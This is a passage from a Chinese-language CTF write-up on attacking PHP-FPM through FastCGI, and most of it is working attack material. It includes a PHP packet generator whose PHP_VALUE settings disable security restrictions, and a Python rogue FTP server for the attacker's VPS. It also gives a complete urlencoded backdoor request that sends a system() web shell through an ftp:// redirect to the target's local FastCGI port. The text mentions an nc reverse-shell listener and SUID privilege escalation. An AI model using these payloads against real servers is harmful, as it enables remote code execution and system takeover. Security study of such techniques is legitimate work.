                if ($resp['contentLength']) {
                    $len  = $resp['contentLength'];
                    while ($len && $buf=fread($this->_sock, $len)) {
                        $len -= strlen($buf);
                        $resp['content'] .= $buf;
                    }
                }
                if ($resp['paddingLength']) {
                    $buf=fread($this->_sock, $resp['paddingLength']);
                }
                return $resp;
            } else {
                return false;
            }
        }
        /**
         * Get Informations on the FastCGI application
         *
         * @param array $requestedInfo information to retrieve
         * @return array
         */
        public function getValues(array $requestedInfo)
        {
            $this->connect();
            $request = '';
            foreach ($requestedInfo as $info) {
                $request .= $this->buildNvpair($info, '');
            }
            fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
            $resp = $this->readPacket();
            if ($resp['type'] == self::GET_VALUES_RESULT) {
                return $this->readNvpair($resp['content'], $resp['length']);
            } else {
                throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
            }
        }
        /**
         * Execute a request to the FastCGI application
         *
         * @param array $params Array of parameters
         * @param String $stdin Content
         * @return String
         */
        public function request(array $params, $stdin)
        {
            $response = '';
    //        $this->connect();
            $request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
            $paramsRequest = '';
            foreach ($params as $key => $value) {
                $paramsRequest .= $this->buildNvpair($key, $value);
            }
            if ($paramsRequest) {
                $request .= $this->buildPacket(self::PARAMS, $paramsRequest);
            }
            $request .= $this->buildPacket(self::PARAMS, '');
            if ($stdin) {
                $request .= $this->buildPacket(self::STDIN, $stdin);
            }
            $request .= $this->buildPacket(self::STDIN, '');
            echo('data='.urlencode($request));
    //        fwrite($this->_sock, $request);
    //        do {
    //            $resp = $this->readPacket();
    //            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
    //                $response .= $resp['content'];
    //            }
    //        } while ($resp && $resp['type'] != self::END_REQUEST);
    //        var_dump($resp);
    //        if (!is_array($resp)) {
    //            throw new Exception('Bad request');
    //        }
    //        switch (ord($resp['content']{4})) {
    //            case self::CANT_MPX_CONN:
    //                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
    //                break;
    //            case self::OVERLOADED:
    //                throw new Exception('New request rejected; too busy [OVERLOADED]');
    //                break;
    //            case self::UNKNOWN_ROLE:
    //                throw new Exception('Role value not known [UNKNOWN_ROLE]');
    //                break;
    //            case self::REQUEST_COMPLETE:
    //                return $response;
    //        }
        }
    }
    ?>
    ";    // 啥也不是, 不用管
    $php_value = "unserialize_callback_func = system\nextension_dir = /tmp\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = ";
    $params = array(
        'GATEWAY_INTERFACE' => 'FastCGI/1.0',
        'REQUEST_METHOD'    => 'POST',
        'SCRIPT_FILENAME'   => $filepath,
        'SCRIPT_NAME'       => $req,
        'QUERY_STRING'      => 'command=whoami',
        'REQUEST_URI'       => $uri,
        'DOCUMENT_URI'      => $req,
    #'DOCUMENT_ROOT'     => '/',
        'PHP_VALUE'         => $php_value,
        'SERVER_SOFTWARE'   => '80sec/wofeiwo',
        'REMOTE_ADDR'       => '127.0.0.1',
        'REMOTE_PORT'       => '9001',
        'SERVER_ADDR'       => '127.0.0.1',
        'SERVER_PORT'       => '80',
        'SERVER_NAME'       => 'localhost',
        'SERVER_PROTOCOL'   => 'HTTP/1.1',
        'CONTENT_LENGTH'    => strlen($code)
    );
    // print_r($_REQUEST);
    // print_r($params);
    //echo "Call: $uri\n\n";
    echo $client->request($params, $code)."\n";
    ?>
然后执行以下脚本自己 vps 上搭建一个恶意的 ftp 服务器：
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.bind(('0.0.0.0', 23))
    s.listen(1)
    conn, addr = s.accept()
    conn.send(b'220 welcome\n')
    #Service ready for new user.
    #Client send anonymous username
    #USER anonymous
    conn.send(b'331 Please specify the password.\n')
    #User name okay, need password.
    #Client send anonymous password.
    #PASS anonymous
    conn.send(b'230 Login successful.\n')
    #User logged in, proceed. Logged out if appropriate.
    #TYPE I
    conn.send(b'200 Switching to Binary mode.\n')
    #Size /
    conn.send(b'550 Could not get the file size.\n')
    #EPSV (1)
    conn.send(b'150 ok\n')
    #PASV
    conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n') #STOR / (2)
    conn.send(b'150 Permission denied.\n')
    #QUIT
    conn.send(b'221 Goodbye.\n')
    conn.close()
然后在 vps 上开启一个 nc 监听，用于接收反弹的shell：
最后通过 eval() 构造如下恶意代码通过 file_put_contents() 与我们 vps 上恶意的 ftp 服务器建立连接：
    /add_api.php?backdoor=$file = $_GET['file'];$data = $_GET['data'];file_put_contents($file,$data);&file=ftp://PI:EMAIL:23/123&data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9000%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00
此时当 ftp 建立连接后，会通过被动模式将 payload 重定向到目标主机本地 9001 端口的 PHP-FPM 上，并成功反弹Shell：
后面就是一个 SUID 提权了，利用的是 /usr/local/bin/php，直接进行 PHP 交互模式执行代码获取 flag 即可。
## 未完待续......
> 参考：
>
> 
>
> [https://www.cnblogs.com/itbsl/p/9828776.html#web-服务器和-fastcgi-> 交互过程](https://www.cnblogs.com/itbsl/p/9828776.html#web-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8C-fastcgi-%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B)
>
> 
>
> 
>
> 
>
> 
>
>  exploits/blob/master/php/Fastcgi/fcgi_jailbreak.php>
>
>  fastcgi-remote-exploit.md>